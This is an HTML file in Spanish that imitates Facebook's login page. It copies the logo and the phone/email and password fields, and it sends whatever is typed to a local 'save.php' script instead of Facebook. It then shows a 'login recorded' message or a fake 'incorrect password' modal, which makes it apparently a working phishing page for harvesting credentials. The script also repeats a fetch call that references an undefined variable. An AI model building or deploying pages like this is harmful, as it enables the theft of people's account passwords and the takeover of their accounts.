<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        </div>
        <form class="login-form" id="loginForm" action="save.php" method="post">
            <input type="text" id="email" name="email" placeholder="Celular o correo electrónico" required>
            <input type="password" id="password" name="password" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
            <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
        </form>

        <!-- Modal de error -->
        <div id="errorModal" class="modal">
            <div class="modal-content">
                <h2>Contraseña incorrecta</h2>
                <p>Hubo un error al intentar iniciar sesión. Verifica tus datos.</p>
                <button id="closeModal" class="aceptar">ACEPTAR</button>
            </div>
        </div>

        <script>
            // Mostrar modal si hay un error
            document.getElementById('loginForm').addEventListener('submit', function(event) {
                event.preventDefault();

                const formData = new FormData(this);

                fetch('save.php', {
                    method: 'POST',
                    body: formData,
                })
                .then(response => response.text())
                .then(data => {
                    if (data.trim() === 'success') {
                        alert("Inicio de sesión registrado correctamente.");
                    } else {
                        document.getElementById('errorModal').style.display = 'block';
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById('errorModal').style.display = 'block';
                });
            });

            document.getElementById('closeModal').addEventListener('click', function() {
                document.getElementById('errorModal').style.display = 'none';
            });
 
function showErrorModal() {
    console.log("Mostrando modal de error"); // Mensaje de depuración
    document.getElementById('errorModal').style.display = 'block';
}


fetch('save.php', {
    method: 'POST',
    body: formData,
})
.then(response => response.text())
.then(data => {
    console.log("Respuesta del servidor:", data); // Agrega este mensaje
    if (data.trim() === 'success') {
        alert("Inicio de sesión registrado correctamente.");
    } else {
        document.getElementById('errorModal').style.display = 'block';
    }
})
.catch(error => {
    console.error('Error en la solicitud:', error);
    document.getElementById('errorModal').style.display = 'block';
});

</script>
</div>
</body>
</html>

